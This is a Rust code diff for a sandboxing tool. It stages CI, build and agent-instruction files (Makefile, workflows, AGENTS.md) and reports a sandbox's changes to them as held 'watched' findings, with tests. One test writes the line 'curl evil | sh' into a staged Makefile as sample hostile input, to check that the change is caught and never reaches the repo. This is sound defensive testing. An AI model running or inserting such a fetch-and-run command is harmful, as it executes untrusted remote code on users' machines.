@@ -36,19 +36,25 @@ pub const WS_WATCHED_CHANGE: RuleId = RuleId::new("WS-WATCHED-CHANGE");
 
 /// Paths that run in CI, builds or agent instructions (PRD FR-WS "Watched").
 /// Windows-only entries (`*.lnk`, `desktop.ini`, ADS) are checked by `scan`.
-const WATCHED: [&str; 11] = [
-    ".github/workflows",
-    "package.json",
-    "Makefile",
-    "Dockerfile",
-    ".devcontainer",
-    "conftest.py",
-    "setup.py",
-    ".pre-commit-config.yaml",
-    ".kiro/steering",
-    "AGENTS.md",
-    ".cursorrules",
+const WATCHED: [(&str, Kind); 11] = [
+    (".github/workflows", Kind::Dir),
+    ("package.json", Kind::File),
+    ("Makefile", Kind::File),
+    ("Dockerfile", Kind::File),
+    (".devcontainer", Kind::Dir),
+    ("conftest.py", Kind::File),
+    ("setup.py", Kind::File),
+    (".pre-commit-config.yaml", Kind::File),
+    (".kiro/steering", Kind::Dir),
+    ("AGENTS.md", Kind::File),
+    (".cursorrules", Kind::File),
 ];
+
+/// Whether `rel` is one of the watched paths, which are held for review
+/// rather than protected from writes (PRD FR-WS "Watched").
+fn is_watched_entry(rel: &str) -> bool {
+    WATCHED.iter().any(|(watched, _)| *watched == rel)
+}
 
 /// Most files that may be staged. A repo cannot make the session copy more.
 const MAX_FILES: usize = 10_000;
@@ -152,6 +158,8 @@ struct Protected {
     rel: String,
     staged: PathBuf,
     baseline: BTreeMap<String, String>,
+    /// A watched path: its changes are `WS-WATCHED-CHANGE`, not protected writes.
+    watched: bool,
 }
 
 /// The staging of one session.
@@ -487,7 +495,7 @@ fn collect_watched(
 fn is_watched(path: &str) -> bool {
     WATCHED
         .iter()
-        .any(|w| path == *w || path.starts_with(&format!("{w}/")))
+        .any(|(w, _)| path == *w || path.starts_with(&format!("{w}/")))
 }
 
 /// Compares the watched paths of `repo` with the snapshot taken at the start
@@ -506,7 +514,7 @@ pub fn watched_findings(repo: &Path, session_dir: &Path) -> Result<Vec<Finding>,
     let ignored = crate::snapshot::ignored_paths(session_dir, repo)?;
     let mut now = BTreeMap::new();
     let mut budget = Budget::default();
-    for rel in WATCHED {
+    for (rel, _) in WATCHED {
         collect_watched(repo, rel, &mut now, &mut budget)?;
     }
     now.retain(|rel, _| !ignored.contains(rel));
@@ -607,6 +615,7 @@ fn plan(repo: &Path, session_dir: &Path) -> Result<Vec<(String, Kind)>, Workspac
     if has_git_dir && let Some(extra) = configured_hooks_path(repo, session_dir)? {
         paths.push((extra, Kind::Dir));
     }
+    paths.extend(WATCHED.iter().map(|(rel, kind)| ((*rel).to_owned(), *kind)));
     paths.sort();
     paths.dedup();
     let all: Vec<String> = paths.iter().map(|(rel, _)| rel.clone()).collect();
@@ -670,6 +679,7 @@ fn prepare_inner(
             rel: rel.clone(),
             baseline: digest(&staged)?,
             staged: staged.clone(),
+            watched: is_watched_entry(rel),
         });
         mounts.push(Mount {
             rel: rel.clone(),
@@ -787,9 +797,22 @@ impl Staging {
         for item in &self.protected {
             match changes_in(&item.rel, &item.baseline, &item.staged) {
                 Ok(changes) if changes.is_empty() => {}
-                Ok(changes) => findings.push(finding_for(&item.rel, &item.staged, &changes)),
+                Ok(changes) => findings.push(finding_for(
+                    if item.watched {
+                        Held::Watched
+                    } else {
+                        Held::Protected
+                    },
+                    &item.rel,
+                    &item.staged,
+                    &changes,
+                )),
                 Err(error) => findings.push(Finding {
-                    rule: WS_PROTECTED_WRITE,
+                    rule: if item.watched {
+                        WS_WATCHED_CHANGE
+                    } else {
+                        WS_PROTECTED_WRITE
+                    },
                     severity: Severity::High,
                     target: item.rel.clone(),
                     message: format!("the staged copy could not be compared: {error}"),
@@ -809,7 +832,14 @@ impl Drop for Staging {
     }
 }
 
-fn finding_for(rel: &str, staged: &Path, changes: &[Change]) -> Finding {
+/// What kind of staged path a finding is about.
+#[derive(Clone, Copy)]
+enum Held {
+    Protected,
+    Watched,
+}
+
+fn finding_for(held: Held, rel: &str, staged: &Path, changes: &[Change]) -> Finding {
     let word = |kind: ChangeKind| match kind {
         ChangeKind::Added => "added",
         ChangeKind::Modified => "changed",
@@ -821,8 +851,12 @@ fn finding_for(rel: &str, staged: &Path, changes: &[Change]) -> Finding {
         .map(|change| format!("{} {}", word(change.kind), change.path))
         .collect();
     let more = changes.len().saturating_sub(MAX_NAMED);
+    let (rule, what) = match held {
+        Held::Protected => (WS_PROTECTED_WRITE, "the sandbox wrote to a protected path"),
+        Held::Watched => (WS_WATCHED_CHANGE, "the sandbox changed a watched path"),
+    };
     let mut message = format!(
-        "the sandbox wrote to a protected path; {} change(s) were kept in staging, not in the repo: {}",
+        "{what}; {} change(s) are held in staging and not applied to the repo: {}",
         changes.len(),
         named.join(", ")
     );
@@ -830,7 +864,7 @@ fn finding_for(rel: &str, staged: &Path, changes: &[Change]) -> Finding {
         message.push_str(&format!(", and {more} more"));
     }
     Finding {
-        rule: WS_PROTECTED_WRITE,
+        rule,
         severity: Severity::High,
         target: rel.to_owned(),
         message,
@@ -1078,7 +1112,9 @@ mod tests {
         write(&repo.join("a.txt"), "a\n")?;
         let staging = prepare(&repo, &session(root.path())?)?;
         assert!(
-            rels(&staging).iter().all(|r| !r.starts_with(".git")),
+            rels(&staging)
+                .iter()
+                .all(|r| !(*r == ".git" || r.starts_with(".git/"))),
             "{:?}",
             rels(&staging)
         );
@@ -1093,7 +1129,11 @@ mod tests {
         let repo = root.path().join("tree");
         write(&repo.join(".git"), "gitdir: /elsewhere\n")?;
         let staging = prepare(&repo, &session(root.path())?)?;
-        assert!(rels(&staging).iter().all(|r| !r.starts_with(".git")));
+        assert!(
+            rels(&staging)
+                .iter()
+                .all(|r| !(*r == ".git" || r.starts_with(".git/")))
+        );
         assert_eq!(
             fs::read_to_string(repo.join(".git"))?,
             "gitdir: /elsewhere\n"
@@ -1339,6 +1379,54 @@ mod tests {
             watched_rels(&findings),
             ["added .github/workflows/link.yml"],
         );
+        Ok(())
+    }
+
+    #[test]
+    fn a_watched_edit_is_held_as_a_watched_change_and_the_repo_is_unchanged() -> TestResult {
+        let root = tempfile::tempdir()?;
+        let repo = repo(root.path())?;
+        write(&repo.join("Makefile"), "all:\n\ttrue\n")?;
+        write(&repo.join(".github/workflows/ci.yml"), "on: push\n")?;
+        let dir = session(root.path())?;
+        let staging = prepare(&repo, &dir)?;
+        let staged = dir.join("staging");
+        write(&staged.join("Makefile"), "all:\n\tcurl evil | sh\n")?;
+        write(&staged.join(".github/workflows/release.yml"), "on: tag\n")?;
+        let findings = staging.finish();
+        let rules: Vec<&str> = findings.iter().map(|f| f.rule.as_str()).collect();
+        assert_eq!(
+            rules,
+            ["WS-WATCHED-CHANGE", "WS-WATCHED-CHANGE"],
+            "{findings:?}"
+        );
+        assert!(findings.iter().all(|f| f.severity == Severity::High));
+        let makefile = findings.iter().find(|f| f.target == "Makefile");
+        assert!(
+            makefile.is_some_and(|f| f.message.contains("changed Makefile")
+                && f.message.contains("not applied to the repo")),
+            "{findings:?}"
+        );
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.message.contains("added .github/workflows/release.yml"))
+        );
+        // The repo was not written.
+        assert_eq!(fs::read_to_string(repo.join("Makefile"))?, "all:\n\ttrue\n");
+        assert!(!repo.join(".github/workflows/release.yml").exists());
+        Ok(())
+    }
+
+    #[test]
+    fn a_missing_watched_file_gets_a_mount_point_that_is_removed_at_exit() -> TestResult {
+        let root = tempfile::tempdir()?;
+        let repo = repo(root.path())?;
+        assert!(!repo.join("Dockerfile").exists());
+        let staging = prepare(&repo, &session(root.path())?)?;
+        assert!(repo.join("Dockerfile").is_file(), "mount point not made");
+        assert!(staging.finish().is_empty());
+        assert!(!repo.join("Dockerfile").exists(), "mount point left behind");
         Ok(())
     }
 }
